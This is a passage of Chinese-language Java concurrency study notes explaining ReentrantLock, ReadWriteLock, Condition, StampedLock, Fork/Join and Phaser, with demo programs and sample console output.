ReentrantLock(true)可以实现多线程在等待同一个锁时，严格按照申请锁的顺序来依次获取锁\n- <font color=\"red\">锁可以绑定多个条件</font>：一个ReentrantLock对象锁可以同时绑定多个Condition对象\n\nReentrantLock核心方法解析\n\n- lock()：尝试获取锁，如果锁已被其它线程获取则等待，lock()方法不能被中断，在死锁情况下会无限等待\n- tryLock()：尝试获取锁，如果锁已被其它线程获取则放弃，立即返回boolean类型标识位\n- tryLock(long var1, TimeUnit var3)：尝试获取锁，如果锁已被其它线程持有则等待var1时间，超时再放弃\n- lockInterruptibly()：相当于把tryLock(long var1, TimeUnit var3)的时间设置成了无限长，但是在等待获取锁的过程中，线程可以被中断\n- unlock()：释放锁\n\nReentrantLock注意事项\n\n- ReentrantLock在异常发生时候不会像synchronized锁一样自动释放锁，所以在使用ReentrantLock时候一定要配合try finally使用来进行释放锁（lock.unlock()）\n- <font color=\"red\">tryLock()方法自带插队属性</font>，也就是说即使设置了new ReentrantLock(true)，使用tryLock()方法获取锁仍然是不公平的\n\n```java\npublic class ReentrantLockTest {\n\n    public static final ReentrantLock lock = new ReentrantLock();\n\n    public static void main(String[] args) {\n        IntStream.rangeClosed(1, 2).forEach(i -> new Thread(() -> needLock()).start());\n        System.out.println(\"-----------------------------------\");\n        TaskFactory.spend(10, TimeUnit.SECONDS);\n        System.out.println(\"-----------------------------------\");\n        IntStream.rangeClosed(1, 2).forEach(i -> new Thread(() -> tryLock()).start());\n    }\n\n    static void needLock() {\n        // 不允许打断\n        lock.lock();\n        try {\n            TaskFactory.spend(2, TimeUnit.SECONDS, true);\n            System.out.println(Thread.currentThread().getName() + \" - 取得锁 ：\" + lock.isHeldByCurrentThread());\n        } finally {\n            lock.unlock();\n            System.out.println(Thread.currentThread().getName() + \" - 释放锁资源：\" + !lock.isLocked());\n        }\n    }\n\n    static void tryLock() {\n        if (lock.tryLock()) {\n            // got the lock\n            try {\n                TaskFactory.spend(5, TimeUnit.SECONDS, true);\n                System.out.println(Thread.currentThread().getName() + \" - 取得锁 ：\" + lock.isHeldByCurrentThread());\n            } finally {\n                lock.unlock();\n                System.out.println(Thread.currentThread().getName() + \" - 释放锁资源：\" + !lock.isLocked());\n            }\n        } else {\n            // do other things\n            System.out.println(Thread.currentThread().getName() + \" - 未取得锁.\");\n        }\n    }\n}\n```\n\n```\n-----------------------------------\nThread-0 finnish task [1652021430165]\nThread-0 - 取得锁 ：true\nThread-0 - 释放锁资源：true\nThread-1 finnish task [1652021432181]\nThread-1 - 取得锁 ：true\nThread-1 - 释放锁资源：true\n-----------------------------------\nThread-3 - 未取得锁.\nThread-2 finnish task [1652021443166]\nThread-2 - 取得锁 ：true\nThread-2 - 释放锁资源：true\n\nProcess finished with exit code 0\n```\n\n## ReadWriteLock\n\n需要解决同时读的排他性\n\n```java\npublic class ReentrantReadWriteLockExample {\n    public static final ReentrantReadWriteLock lock = new ReentrantReadWriteLock();\n    public static final ReentrantReadWriteLock.ReadLock readLock = lock.readLock();\n    public static final ReentrantReadWriteLock.WriteLock writeLock = lock.writeLock();\n\n    public static void main(String[] args) {\n        // new Thread(ReadWriteLockExample::doWriteAction, \"A1\").start();\n        // 同时读，不会排他\n        new Thread(ReentrantReadWriteLockExample::readFiles, \"A1\").start();\n        new Thread(ReentrantReadWriteLockExample::readFiles, \"A2\").start();\n    }\n\n    static void readFiles() {\n        try {\n            readLock.lock();\n            TaskFactory.spend(5, TimeUnit.SECONDS, true);\n            System.out.println(Thread.currentThread().getName() + \" 开始读操作\");\n            TaskFactory.spend(3, TimeUnit.SECONDS);\n        } finally {\n            readLock.unlock();\n            System.out.println(Thread.currentThread().getName() + \" 完成读操作\");\n        }\n    }\n\n    static void writeFiles() {\n        try {\n            writeLock.lock();\n            System.out.println(Thread.currentThread().getName() + \" 开始写操作\");\n            TaskFactory.spend(3, TimeUnit.SECONDS);\n        } finally {\n            writeLock.unlock();\n            System.out.println(Thread.currentThread().getName() + \" 完成写操作\");\n        }\n    }\n}\n```\n\n## Condition\n\n作用：monitor对象的wait、notify\n\n使用：condition.await()/ condition.signal()，需要配合lock使用\n\n### 当个等待锁队列\n\n```java\npackage hots.utils.condition;\n\nimport java.util.Optional;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\n/**\n * @author: DH\n * @date: 2022/3/5\n * @desc:\n */\npublic class ConditionExample {\n    private final static ReentrantLock sourceLock = new ReentrantLock();\n    //  condition 是由lock创建\n    private final static Condition condition = sourceLock.newCondition();\n\n    private static int data = 0;\n\n    private static boolean isUsed = false;\n\n\n    public static void main(String[] args) {\n        new Thread(() -> {\n            while (true) {\n                buildData();\n            }\n        }).start();\n\n        new Thread(() -> {\n            while (true) {\n                useData();\n            }\n        }).start();\n    }\n\n    private static void buildData() {\n        try {\n            sourceLock.lock(); // synchronized 关键词 (monitor enter)\n            while (!isUsed) {\n                condition.await();　// monitor await\n            }\n\n            TimeUnit.SECONDS.sleep(1);\t\n            data++;\n            Optional.of(\"P：\" + data).ifPresent(System.out::println);\n            isUsed = false;\n            condition.signal(); // monitor notify\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            sourceLock.unlock(); // monitor end\n        }\n    }\n\n\n    private static void useData() {\n        try {\n            sourceLock.lock();\n            while (isUsed) {\n                condition.await();\n            }\n            TimeUnit.SECONDS.sleep(1);\n            Optional.of(\"C：\" + data).ifPresent(System.out::println);\n            isUsed = true;\n            condition.signal();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            sourceLock.unlock();\n        }\n    }\n}\n```\n\n###  多个等待锁队列\n\n```\npackage practice.util.lock.condition;\n\nimport practice.common.TaskFactory;\n\nimport java.util.LinkedList;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.stream.IntStream;\n\n/**\n * 多线程生产、多线程消费\n *\n * @author: DH\n * @date: 2022/6/12\n * @desc:\n */\npublic class ConditionExample3 {\n\n    private static Lock lock = new ReentrantLock();\n\n    private static final Condition PRODUCE_COND = lock.newCondition();\n\n    private static final Condition CONSUMER_COND = lock.newCondition();\n\n    private static final LinkedList<Long> TIMESTAMP_POOL = new LinkedList<>();\n\n    private static final int MAX_SIZE = 100;\n\n    public static void main(String[] args) {\n        // 包装多名生产者\n        IntStream.rangeClosed(1, 5).boxed().forEach(ConditionExample3::doBuildData);\n        // 包装多名消费者\n        IntStream.rangeClosed(1, 8).boxed().forEach(ConditionExample3::doConsumeData);\n    }\n\n    private static void doBuildData(int index) {\n        // 生产者不间断生产数据\n        new Thread(() -> {\n            while (true) {\n                buildData();\n                TaskFactory.spend(1, TimeUnit.SECONDS);\n            }\n        }, \"P(\" + index + \")\").start();\n    }\n\n    private static void doConsumeData(int index) {\n        // 消费者不间断消费数据\n        new Thread(() -> {\n            while (true) {\n                useData();\n                TaskFactory.spend(1, TimeUnit.SECONDS);\n            }\n        }, \"C(\" + index + \")\").start();\n    }\n\n    private static void buildData() {\n        try {\n            lock.lock();\n            while (TIMESTAMP_POOL.size() > MAX_SIZE) {\n                PRODUCE_COND.await();\n            }\n            TaskFactory.spend(1, TimeUnit.SECONDS);\n            long value = System.currentTimeMillis();\n            TIMESTAMP_POOL.addLast(value);\n            System.out.println(Thread.currentThread() + \"->\" + value);\n            CONSUMER_COND.signalAll();\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    private static void useData() {\n        try {\n            lock.lock();\n            while (TIMESTAMP_POOL.isEmpty()) {\n                CONSUMER_COND.await();\n            }\n            TaskFactory.spend(1, TimeUnit.SECONDS);\n            long value = TIMESTAMP_POOL.removeFirst();\n            System.out.println(Thread.currentThread() + \"->\" + value);\n            PRODUCE_COND.signalAll();\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        } finally {\n            lock.unlock();\n        }\n    }\n}\n```\n\n## StampedLock\n\n### 产生背景\n\nReentrantReadWriteLock使得多个读线程同时持有读锁（只要写锁未被占用），而写锁是独占的。\n\n但是，读写锁如果使用不当，很容易产生<font color='red'>**“写饥饿”**</font>问题\n\n比如在读线程非常多，写线程很少的情况下，很容易导致写线程“饥饿”，虽然使用“公平”策略可以一定程度上缓解这个问题，但是“公平”策略是以牺牲系统吞吐量为代价的。\n\n### StampedLock的主要特点\n\n1. 所有获取锁的方法，都返回一个邮戳（Stamp），Stamp为0表示获取失败，其余都表示成功；\n\n2. 所有释放锁的方法，都需要一个邮戳（Stamp），这个Stamp必须是和成功获取锁时得到的Stamp一致；\n\n3. StampedLock是不可重入的；（如果一个线程已经持有了写锁，再去获取写锁的话就会造成死锁）\n\n4. StampedLock有三种访问模式：\n\n   ① Reading（读模式）：功能和ReentrantReadWriteLock的读锁类似\n\n   ② Writing（写模式）：功能和ReentrantReadWriteLock的写锁类似\n\n   ③ Optimistic reading（乐观读模式）：这是一种优化的读模式。\n\n   ​\t我们知道，在ReentrantReadWriteLock中，当读锁被使用时，如果有线程尝试获取写锁，该写线程会阻塞。\n\n   ​\t但是，在Optimistic reading中，即使读线程获取到了读锁，写线程尝试获取写锁也不会阻塞，这相当于对读模式的优化，但是可能会导致数据不一致的问题。\n\n   ​\t所以，**当使用Optimistic reading获取到读锁时，必须对获取结果进行校验**。\n\n5. StampedLock支持读锁和写锁的相互转换\n\n   我们知道RRW中，当线程获取到写锁后，可以降级为读锁，但是读锁是不能直接升级为写锁的。\n   StampedLock提供了读锁和写锁相互转换的功能，使得该类支持更多的应用场景。\n\n6. 无论写锁还是读锁，都不支持Conditon等待\n\n### 悲观读（读锁和写锁互斥）\n\n```java\npackage practice.util.lock.stamp;\n\nimport practice.common.TaskFactory;\n\nimport java.util.LinkedList;\nimport java.util.Optional;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.StampedLock;\nimport java.util.stream.Collectors;\nimport java.util.stream.IntStream;\n\n/**\n * @author: DH\n */\npublic class StampedLockTest {\n\n    private static final StampedLock STAMPED_LOCK = new StampedLock();\n\n    private static final LinkedList<Long> DATA = new LinkedList<>();\n\n    public static void main(String[] args) {\n        final ExecutorService executorService = Executors.newFixedThreadPool(10);\n\n        IntStream.rangeClosed(1, 10).forEach(index -> {\n            if (index % 9 == 0) {\n                // 写数据\n                executorService.submit(() -> {\n                    while (true) {\n                        write();\n                    }\n                });\n            } else {\n                // 读数据\n                executorService.submit(() -> {\n                    while (true) {\n                        read();\n                    }\n                });\n            }\n        });\n    }\n\n    public static void read() {\n        long stamp = -1;\n        try {\n            // 获取锁，并获取时间戳\n            stamp = STAMPED_LOCK.readLock();\n            Optional.of(DATA.stream().map(String::valueOf).collect(Collectors.joining(\"、\", \"R-\", \"\")))\n                    .ifPresent(System.out::println);\n\n            TaskFactory.spend(1, TimeUnit.SECONDS);\n        } finally {\n            // 按照时间戳释放锁\n            STAMPED_LOCK.unlockRead(stamp);\n        }\n    }\n\n    public static void write() {\n        long stamp = -1;\n        try {\n            stamp = STAMPED_LOCK.writeLock();\n            long value = System.currentTimeMillis();\n            DATA.addLast(value);\n            System.out.println(\"C:\" + value);\n        } finally {\n            STAMPED_LOCK.unlockWrite(stamp);\n        }\n    }\n}\n```\n\n\n\n### 乐观读：Optimistic reading\n\n“Optimistic reading”的使用必须遵循以下模式：\n\n```csharp\nlong stamp = lock.tryOptimisticRead();  // 非阻塞获取版本信息\ncopyVaraibale2ThreadMemory();           // 拷贝变量到线程本地堆栈\nif(!lock.validate(stamp)){              // 校验在拷贝过程中有没有排他锁抢占，如果有则悲观读\n    long stamp = lock.readLock();       // 获取读锁\n    try {\n        copyVaraibale2ThreadMemory();   // 拷贝变量到线程本地堆栈\n     } finally {\n       lock.unlock(stamp);              // 释放悲观锁\n    }\n}\nuseThreadMemoryVarables();              // 使用线程本地堆栈里的数据进行操作\n```\n\n以下为乐观读DEMO：\n\n```java\npackage practice.util.lock.stamp;\n\nimport practice.common.TaskFactory;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.StampedLock;\nimport java.util.stream.Collectors;\nimport java.util.stream.IntStream;\n\n/**\n * 乐观读\n *\n * @author: DH\n * @date: 2022/6/12\n * @desc:\n */\npublic class StampedLockOptimisticTest {\n    private static final StampedLock stampedLock = new StampedLock();\n\n    private static final List<Long> DATA = new ArrayList<>();\n\n    public static void main(String[] args) {\n        final ExecutorService executorService = Executors.newFixedThreadPool(10);\n        IntStream.rangeClosed(1, 10).forEach(index -> {\n            if (index % 8 == 0) {\n                // 写数据\n                executorService.submit(() -> {\n                    while (true) {\n                        write();\n                    }\n                });\n            } else {\n                // 读数据\n                executorService.submit(() -> {\n                    while (true) {\n                        optimisticRead();\n                    }\n                });\n            }\n        });\n    }\n\n    public static void optimisticRead() {\n        // 获取锁，并获取时间戳\n        long stamp = stampedLock.tryOptimisticRead();\n        // 乐观读，必须先拷贝一份数据到在方法中\n        List<Long> local = new ArrayList<>();\n        local.addAll(DATA);\n        // 检查在拷贝过程中有没有排他锁抢占，如果有则悲观读\n        if (!stampedLock.validate(stamp)) {\n            stamp = stampedLock.readLock();\n            try {\n                System.out.println(\">>>>>>>> 重新读取数据到本地 >>>>>>>>\");\n                local.clear();\n                local.addAll(DATA);\n            } finally {\n                stampedLock.unlockRead(stamp);\n            }\n        }\n\n        // 使用数据\n        Optional.of(local.stream().map(String::valueOf).collect(Collectors.joining(\"、\", \"R-\", \"\")))\n                .ifPresent(System.out::println);\n        TaskFactory.spend(1, TimeUnit.SECONDS);\n    }\n\n    public static void write() {\n        long stamp = stampedLock.writeLock();\n        try {\n            long value = System.currentTimeMillis();\n            System.out.println(\"W-\" + value);\n            System.out.println();\n            DATA.add(value);\n        } finally {\n            stampedLock.unlockWrite(stamp);\n        }\n    }\n}\n```\n\n#  Fork/Join框架\n\n\n\n1. Fork/Join任务的原理：判断一个任务是否足够小，如果是，直接计算，否则，就分拆成几个小任务分别计算。这个过程可以反复“裂变”成一系列小任务。\n\n2. 基于工作窃取算法（work-stealing）\n\n3. Fork/Join机制可能只能在单个jvm上运行\n\n## RecursiveTask：有返回\n\n```java\npublic abstract class RecursiveTask<V> extends ForkJoinTask<V>\n```\n\n实验demo : 1~10000 求和\n\n```java\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.concurrent.ForkJoinTask;\nimport java.util.concurrent.RecursiveTask;\nimport java.util.stream.IntStream;\n\n/**\n * @author: DH\n * @date: 2022/6/20\n * @desc:\n */\npublic class RecursiveTaskDemo {\n    // 可执行容量\n    private static final int TASK_CAPACITY = 3;\n\n    public static void main(String[] args) {\n        final ForkJoinPool forkJoinPool = new ForkJoinPool();\n        ForkJoinTask<Integer> future = forkJoinPool.submit(new CalculateRecursiveTask(1, 100));\n        System.out.println(\"================== other tasks ====================\");\n        try {\n            System.out.println(\"================== action results \" + future.get());\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } catch (ExecutionException e) {\n            e.printStackTrace();\n        } finally {\n            forkJoinPool.shutdown();\n        }\n    }\n\n    // 计算\n    private static class CalculateRecursiveTask extends RecursiveTask<Integer> {\n        private final int start;\n        private final int end;\n\n        public CalculateRecursiveTask(int start, int end) {\n            if (end >= start) {\n                this.start = start;\n                this.end = end;\n            } else {\n                this.end = start;\n                this.start = end;\n            }\n        }\n\n        @Override\n        protected Integer compute() {\n            if (end - start <= TASK_CAPACITY) {\n                // 执行任务\n                return IntStream.rangeClosed(start, end).sum();\n            } else {\n                // 拆分任务\n                int middle = (end + start) / 2;\n                CalculateRecursiveTask taskLeft = new CalculateRecursiveTask(start, middle);\n                CalculateRecursiveTask taskRight = new CalculateRecursiveTask(middle + 1, end);\n                // 加入ForkJoinPool.WorkQueue \n                taskLeft.fork();\n                // 加入ForkJoinPool.WorkQueue \n                taskRight.fork();\n\n                // 等待任务执行完成并返回\n                return taskLeft.join() + taskRight.join();\n            }\n        }\n    }\n}\n\n```\n\n## RecursiveAction：无返回\n\n如果有返回值，需要构造一个共同访问区域。\n\n```java\nimport java.util.Optional;\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.concurrent.RecursiveAction;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.stream.IntStream;\n\n/**\n * @author: DH\n * @date: 2022/6/20\n * @desc:\n */\npublic class RecursiveActionDemo {\n    //  线程共享\n    private static final AtomicInteger SUM_RESULT = new AtomicInteger();\n    // 可执行容量\n    private static final int TASK_CAPACITY = 3;\n\n    public static void main(String[] args) {\n        final ForkJoinPool forkJoinPool = new ForkJoinPool();\n        try {\n            forkJoinPool.submit(new CalculateRecursiveActon(1, 100));\n            while (forkJoinPool.getActiveThreadCount() > 0) {\n                // 等待执行完成\n                System.out.println(forkJoinPool.getActiveThreadCount());\n                TaskFactory.spend(1, TimeUnit.NANOSECONDS);\n            }\n            Optional.of(SUM_RESULT).ifPresent(System.out::println);\n        } finally {\n            forkJoinPool.shutdown();\n        }\n    }\n\n    private static class CalculateRecursiveActon extends RecursiveAction {\n        private final int start;\n        private final int end;\n\n        public CalculateRecursiveActon(int start, int end) {\n            if (end >= start) {\n                this.start = start;\n                this.end = end;\n            } else {\n                this.end = start;\n                this.start = end;\n            }\n\n        }\n\n        @Override\n        protected void compute() {\n            if (end - start <= TASK_CAPACITY) {\n                SUM_RESULT.getAndAdd(IntStream.rangeClosed(start, end).sum());\n            } else {\n                int middle = (end + start) / 2;\n                // 任务拆分\n                CalculateRecursiveActon left = new CalculateRecursiveActon(start, middle);\n                CalculateRecursiveActon right = new CalculateRecursiveActon(middle + 1, end);\n                // 任务入池\n                left.fork();\n                right.fork();\n            }\n        }\n    }\n}\n```\n\n\n\n# Phaser\n\n## 监控方法\n\n- `public int getRegisteredParties()`返回在当前phase上注册的party数目\n- `public int getArrivedParties()`返回已经到达当前phase的party的数量，如果这个phaser已经终止，返回值是无意义和任意的\n- `public int getUnarrivedParties()`返回还未到达当前phase的party的数量，如果这个phaser已经终止，返回值是无意义和任意的\n- `public final int getPhase()`返回当前阶段号, 最大值是Integer.MAX_VALUE，到达最大值之后，从0重新计数\n\n```java\npublic class PhaserExample4 {\n    public static void main(String[] args) {\n        final Phaser phaser = new Phaser(5);\n        phaser.bulkRegister(5);\n        monitor(1, \"phaser.getRegisteredParties\", phaser.getRegisteredParties());\n        monitor(1, \"phaser.getArrivedParties\", phaser.getArrivedParties());\n        new Thread(phaser::arriveAndAwaitAdvance).start();\n        monitor(2, \"phaser.getArrivedParties\", phaser.getArrivedParties());\n        monitor(2, \"phaser.getUnarrivedParties\", phaser.getUnarrivedParties());\n    }\n\n    static void monitor(int index, String item, Object object) {\n        System.out.printf(\"【%s】【monitor-%d】【%30s】%s\\n\", Thread.currentThread().getName(), index, item, object);\n    }\n}\n```\n\n## 动态注册特性\n\n`public int register()` 动态注册\n\n`public int bulkRegister(int parties)`批量注册\n\n`public int arriveAndAwaitAdvance()` 类似CyclicBarrier 的await方法\n\n```java\nimport practice.common.TaskFactory;\n\nimport java.util.concurrent.Phaser;\nimport java.util.concurrent.TimeUnit;\nimport java.util.stream.IntStream;\n\npublic class PhaserExample1 {\n\n    public static void main(String[] args) {\n        final Phaser phaser = new Phaser();\n        IntStream.rangeClosed(1, 5).boxed().map(i -> phaser).forEach(Task::new);\n        System.out.println(\"【BEGIN-RegisteredParties】\" + phaser.getRegisteredParties());\n        // 注册main线程\n        phaser.register();\n        // 到达并且等待前行\n        phaser.arriveAndAwaitAdvance();\n        // 等待所有线程全部到达隔离点之后执行\n        System.out.println(\"【END-RegisteredParties】\" + phaser.getRegisteredParties());\n\n        System.out.println(\"【\" + Thread.currentThread().getName() + \" 】 all threads finished the work.\");\n\n        System.out.println(\"【other work】\");\n    }\n\n    private static class Task extends Thread {\n        private Phaser phaser;\n\n        public Task(Phaser phaser) {\n            this.phaser = phaser;\n            // 动态追加party\n            this.phaser.register();\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            TaskFactory.spend(2, TimeUnit.SECONDS);\n            System.out.println(Thread.currentThread().getName() + \"：finished and continue\");\n            // 到达并且等待前行\n            this.phaser.arriveAndAwaitAdvance();\n        }\n    }\n}\n\n```\n\n输出结果\n\n```java\nThread-2：finished and continue\nThread-3：finished and continue\nThread-4：finished and continue\nThread-0：finished and continue\nThread-1：finished and continue\n【END-RegisteredParties】6\n【main 】 all threads finished the work.\n【other work】\n```\n\n## 重复使用计数器\n\n`public final int getPhase()` ：获取已执行阶段数（从0开始，每执行一轮，计数器加1）\n\n```java\npackage practice.util.phaser;\n\nimport practice.common.TaskFactory;\n\nimport java.util.Random;\nimport java.util.concurrent.Phaser;\nimport java.util.stream.IntStream;\n\npublic class PhaserExample2 {\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) {\n        // 监控5个运动员（指定parties）\n        final Phaser phaser = new Phaser(5);\n        IntStream.rangeClosed(1, 5).boxed().map(i -> phaser).forEach(Athlete::new);\n    }\n\n    public static class Athlete extends Thread {\n        // 运动员编号\n        private final Phaser phaser;\n\n        public Athlete(Phaser phaser) {\n            this.phaser = phaser;\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            // step1: 游泳\n            monitor(0, \"phaser.getPhase\", phaser.getPhase());\n            actionDeal(\"swimming\");\n            // 等待所有运动员完成游泳任务，继续执行\n            phaser.arriveAndAwaitAdvance();\n            // step2: 自行车\n            monitor(1, \"phaser.getPhase\", phaser.getPhase());\n            actionDeal(\"bicycle\");\n            // 等待所有运动员完成自行车任务，继续执行\n            phaser.arriveAndAwaitAdvance();\n            // step3: 长跑\n            monitor(2, \"phaser.getPhase\", phaser.getPhase());\n            actionDeal(\"running\");\n            // 等待所有运动员完成长跑任务，继续执行\n            phaser.arriveAndAwaitAdvance();\n\n            System.out.println(\"【\" + Thread.currentThread().getName() + \"】 finish all tasks.\");\n        }\n\n        static void monitor(int index, String item, Object object) {\n            System.out.printf(\"\\t【monitor】【%s】【%d】【%s】%s\\n\", Thread.currentThread().getName(), index, item, object);\n        }\n\n        static void actionDeal(String taskName) {\n            TaskFactory.spendSeconds(random.nextInt(6));\n            System.out.println(\"【\" + Thread.currentThread().getName() + \"】 finish  \" + taskName + \".\");\n        }\n    }\n}\n```\n\n执行结果\n\n```java\n\t【monitor】【Thread-0】【0】【phaser.getPhase】0\n\t【monitor】【Thread-4】【0】【phaser.getPhase】0\n\t【monitor】【Thread-3】【0】【phaser.getPhase】0\n\t【monitor】【Thread-1】【0】【phaser.getPhase】0\n\t【monitor】【Thread-2】【0】【phaser.getPhase】0\n【Thread-0】 finish  swimming.\n【Thread-2】 finish  swimming.\n【Thread-1】 finish  swimming.\n【Thread-3】 finish  swimming.\n【Thread-4】 finish  swimming.\n\t【monitor】【Thread-2】【1】【phaser.getPhase】1\n\t【monitor】【Thread-0】【1】【phaser.getPhase】1\n\t【monitor】【Thread-3】【1】【phaser.getPhase】1\n\t【monitor】【Thread-1】【1】【phaser.getPhase】1\n\t【monitor】【Thread-4】【1】【phaser.getPhase】1\n【Thread-0】 finish  bicycle.\n【Thread-2】 finish  bicycle.\n【Thread-4】 finish  bicycle.\n【Thread-3】 finish  bicycle.\n【Thread-1】 finish  bicycle.\n\t【monitor】【Thread-1】【2】【phaser.getPhase】2\n\t【monitor】【Thread-3】【2】【phaser.getPhase】2\n\t【monitor】【Thread-2】【2】【phaser.getPhase】2\n\t【monitor】【Thread-4】【2】【phaser.getPhase】2\n\t【monitor】【Thread-0】【2】【phaser.getPhase】2\n【Thread-0】 finish  running.\n【Thread-2】 finish  running.\n【Thread-3】 finish  running.\n【Thread-1】 finish  running.\n【Thread-4】 finish  running.\n【Thread-4】 finish all tasks.\n【Thread-2】 finish all tasks.\n【Thread-3】 finish all tasks.\n【Thread-1】 finish all tasks.\n【Thread-0】 finish all tasks.\n```\n\n## 减少计数器（动态销户）\n\n需要注意：销户之后的<font color='red'>return</font>，否则仍然会参与后续流程的计数\n\n```java\nimport practice.common.TaskFactory;\n\nimport java.util.Random;\nimport java.util.concurrent.Phaser;\nimport java.util.stream.IntStream;\n\n/**\n * Phaser 减少计数器（动态销户）\n */\npublic class PhaserExample3 {\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) {\n        // 监控5个运动员\n        final Phaser phaser = new Phaser(5);\n        IntStream.rangeClosed(1, 5).boxed().map(i -> phaser).forEach(Athlete::new);\n    }\n\n    public static class Athlete extends Thread {\n        // 运动员编号\n        private final Phaser phaser;\n\n        public Athlete(Phaser phaser) {\n            this.phaser = phaser;\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            // step1: 游泳\n            monitor(0, phaser);\n            actionDeal(\"swimming\");\n            phaser.arriveAndAwaitAdvance();\n            // step2: 自行车\n            if (Thread.currentThread().getName().endsWith(\"2\")) {\n                monitor(1, phaser);\n                actionFailed(\"bicycle\");\n                // 运动员退出比赛（退出计数）\n                phaser.arriveAndDeregister();\n                // 退出计数之后，后续流程不在参与重新参与计数\n                return;\n            } else {\n                monitor(1, phaser);\n                actionDeal(\"bicycle\");\n                phaser.arriveAndAwaitAdvance();\n            }\n            // step3: 长跑\n            monitor(2, phaser);\n            actionDeal(\"running\");\n            phaser.arriveAndAwaitAdvance();\n\n            System.out.println(\"【\" + Thread.currentThread().getName() + \"】 finish all tasks.\");\n        }\n\n        static void monitor(int index, Phaser phaser) {\n            String formatter = \"\\t【monitor】【%s】【%d】【%s】%s\\n\";\n            String threadName = Thread.currentThread().getName();\n            System.out.printf(formatter, threadName, index, \"RegisteredParties\", phaser.getRegisteredParties());\n        }\n\n        static void actionDeal(String taskName) {\n            TaskFactory.spendSeconds(random.nextInt(6));\n            System.out.println(\"【\" + Thread.currentThread().getName() + \"】 finish  \" + taskName + \".\");\n        }\n\n        static void actionFailed(String taskName) {\n            System.out.println(\"【\" + Thread.currentThread().getName() + \"】 failed  \" + taskName + \".\");\n        }\n    }\n}\n```\n\n输出结果\n\n```java\n【monitor】【Thread-0】【0】【RegisteredParties】5\n\t【monitor】【Thread-3】【0】【RegisteredParties】5\n\t【monitor】【Thread-4】【0】【RegisteredParties】5\n\t【monitor】【Thread-2】【0】【RegisteredParties】5\n\t【monitor】【Thread-1】【0】【RegisteredParties】5\n【Thread-2】 finish  swimming.\n【Thread-3】 finish  swimming.\n【Thread-1】 finish  swimming.\n【Thread-0】 finish  swimming.\n【Thread-4】 finish  swimming.\n\t【monitor】【Thread-4】【1】【RegisteredParties】5\n\t【monitor】【Thread-0】【1】【RegisteredParties】5\n\t【monitor】【Thread-3】【1】【RegisteredParties】5\n\t【monitor】【Thread-1】【1】【RegisteredParties】5\n\t【monitor】【Thread-2】【1】【RegisteredParties】5\n【Thread-2】 failed  bicycle.\n【Thread-2】 withdrew the game.\n【Thread-4】 finish  bicycle.\n【Thread-3】 finish  bicycle.\n【Thread-1】 finish  bicycle.\n【Thread-0】 finish  bicycle.\n\t【monitor】【Thread-0】【2】【RegisteredParties】4\n\t【monitor】【Thread-4】【2】【RegisteredParties】4\n【Thread-4】 finish  running.\n\t【monitor】【Thread-3】【2】【RegisteredParties】4\n\t【monitor】【Thread-1】【2】【RegisteredParties】4\n【Thread-0】 finish  running.\n【Thread-1】 finish  running.\n【Thread-3】 finish  running.\n【Thread-3】 finish all tasks.\n【Thread-0】 finish all tasks.\n【Thread-1】 finish all tasks.\n【Thread-4】 finish all tasks.\n```\n\n\n\n## 人为控制Phase的终结：onAdvance\n\n1. 使用方法：覆写`onAdvance`方法\n\n   ```java\n   final Phaser phaser = new Phaser(2) {\n     @Override\n     protected boolean onAdvance(int phase, int registeredParties) {\n       // return registeredParties == 0; 原始写法\n       return true; \n     }\n   };\n   ```\n\n2. `onAdvance `的返回结果直接设置为`returen true` ，则`arriveAndAwaitAdvance`不会阻塞等待所有的`parties`\n\n   ```java\n   package practice.util.phaser;\n   \n   import practice.common.TaskFactory;\n   \n   import java.util.concurrent.Phaser;\n   import java.util.stream.IntStream;\n   \n   /**\n    * 人为控制phase的终结：onAdvance\n    */\n   public class PhaserExample5 {\n       public static void main(String[] args) {\n           final Phaser phaser = new Phaser(2) {\n               @Override\n               protected boolean onAdvance(int phase, int registeredParties) {\n                   // 无论执行情况，都默认，phase 执行结束。\n                   return true;\n               }\n           };\n           IntStream.rangeClosed(1, 2).boxed().map(i -> phaser).forEach(OnAdvanceTask::new);\n       }\n   \n       static class OnAdvanceTask extends Thread {\n           private final Phaser phaser;\n   \n           public OnAdvanceTask(Phaser phaser) {\n               this.phaser = phaser;\n               this.start();\n           }\n   \n           @Override\n           public void run() {\n               System.out.println(\"【\" + this.getName() + \"】 arrived part one\");\n               phaser.arriveAndAwaitAdvance();\n               System.out.println(\"【\" + this.getName() + \"】 passed part one\");\n               TaskFactory.spendSeconds(1);\n               monitor(1, phaser);\n               if (this.getName().endsWith(\"1\")) {\n                   System.out.println(\"【\" + this.getName() + \"】 arrived part two\");\n                   // onAdvance 设置为true，arriveAndAwaitAdvance不会阻塞\n                   // onAdvance 设置false/ 使用默认的onAdvance，Thread-1 会阻塞在此处\n                   phaser.arriveAndAwaitAdvance();\n                   System.out.println(\"【\" + this.getName() + \"】 passed part two\");\n               }\n               monitor(2, phaser);\n               // onAdvance 设置false/ 使用默认的onAdvance，Thread-0 会阻塞在此处\n               phaser.arriveAndAwaitAdvance();\n               monitor(3, phaser);\n           }\n       